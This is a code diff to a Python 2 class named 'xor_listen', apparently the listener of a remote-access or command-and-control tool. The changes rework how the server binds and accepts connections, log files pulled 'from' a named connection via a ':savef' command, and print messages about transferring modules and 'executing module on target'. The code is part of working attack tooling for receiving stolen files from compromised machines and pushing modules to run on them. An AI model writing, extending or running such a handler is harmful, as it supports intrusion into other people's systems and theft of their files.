@@ -992,16 +992,20 @@ class xor_listen:
         else:
             print("[!] File not found!")
         
-    def start(self, HOST, PORT, pin):
+    def start(self, HOST, PORT, pkey, name):
         HOST = HOST
         PORT = int(PORT)
+        
+        global pin
         global server
+        pin = pkey
+
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         
         try:
-            server.bind((LHOST, LPORT))
+            server.bind((HOST, PORT))
             server.listen(5)
-            print("Listening on port %s.." % LPORT)
+            print("Listening on port %s.." % PORT)
             global conn
             conn, addr = server.accept()
             print("New Connection!")
@@ -1016,10 +1020,10 @@ class xor_listen:
             if data2.startswith(":savef"):
                 getname = data2.split(" ")
                 fname = getname[1]
+                logging.info("Saved file %s from %s" % (fname, name))
                 self.download(fname)
                 
             elif data2 == ("Complete"):
-                writelog("Executed %s")
                 print "[+] Module transfer successful."
                 print "[+] Executing module on target..."
                 
@@ -1030,7 +1034,7 @@ class xor_listen:
                 
                 if cmd == (':killme'):
                     print("[!] Shutting down server!")
-                    conn.close()
+                    server.close()
                     management.core()
                     
                 elif cmd == (':quit'):
@@ -1095,7 +1099,7 @@ class xor_listen:
                     print Modules
                         
                 elif cmd == (":files"):
-                    print("\n[+] Contents of Stored directory: ")
+                    print("\n[+] Contents of Storage directory: ")
                     os.system("ls %s" % Download_Dir)
                     
                     
